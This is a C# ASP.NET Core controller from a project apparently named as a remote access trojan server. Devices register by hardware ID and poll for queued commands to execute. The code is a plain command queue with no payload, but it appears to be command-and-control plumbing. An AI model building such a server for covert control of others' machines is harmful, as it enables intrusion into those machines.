using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Rat_Server.Model;
using Rat_Server.Model.DTOs;

namespace Rat_Server.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class DeviceController : ControllerBase
    {
        private readonly RatDbContext _context;
        private readonly IConfiguration _config;

        public DeviceController(RatDbContext context, IConfiguration config)
        {
            _context = context;
            _config = config;
        }

        [HttpPost("RegisterDevice")]
        [ProducesResponseType(StatusCodes.Status201Created)]
        [ProducesResponseType(StatusCodes.Status400BadRequest)]
        [ProducesResponseType(StatusCodes.Status403Forbidden)]
        public StatusCodeResult RegisterDevice([FromBody] RegisterDeviceRequestDto requestBody)
        {
            // Check if request body is valid
            if (!ModelState.IsValid)
            {
                return StatusCode(StatusCodes.Status400BadRequest);
            }

            // Check if the device is already registered
            if (_context.Devices.Find(new Guid(requestBody.Hwid)) != null)
            {
                // Return a 403 error code if it already exists
                return StatusCode(StatusCodes.Status403Forbidden);
            }

            // Create a Device object that we'll add to the database
            Device device = new Device
            {
                Hwid = new Guid(requestBody.Hwid),
                Name = requestBody.DeviceName,
                LastActive = DateTime.Now
            };

            // Insert the Device object into the database
            _context.Devices.Add(device);
            _context.SaveChanges();

            return StatusCode(StatusCodes.Status201Created);
        }

        [HttpGet("GetCurrentCommandForDevice")]
        [ProducesResponseType(typeof(CurrentCommandDto), StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status204NoContent)]
        [ProducesResponseType(StatusCodes.Status400BadRequest)]
        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
        public ActionResult<CurrentCommandDto> GetCurrentCommandForDevice([FromHeader] Guid Hwid)
        {
            // If the client didn't provide a Hwid, send back a Bad Request status code
            if (!ModelState.IsValid)
            {
                return StatusCode(StatusCodes.Status400BadRequest);
            }

            // If the client's Hwid isn't registered, send back an Unauthorized status code
            if(_context.Devices.Find(Hwid) == null)
            {
                return StatusCode(StatusCodes.Status401Unauthorized);
            }

            // Retrieve the list of commands for the device and order them by the date they were added
            List<Command> commands = _context.Commands.Where(c => c.Device.Hwid == Hwid).OrderBy(c => c.DateAdded).ToList();
            
            if(commands.Any())
            {
                // The first element of the list is the current command the device needs to execute
                Command command = commands.First();

                return Ok(new CurrentCommandDto {
                    commandId = command.commandId.ToString(),
                    CommandValue = command.CommandValue
                });
            }
            else
            {
                return NoContent();
            }
        }
    }
}
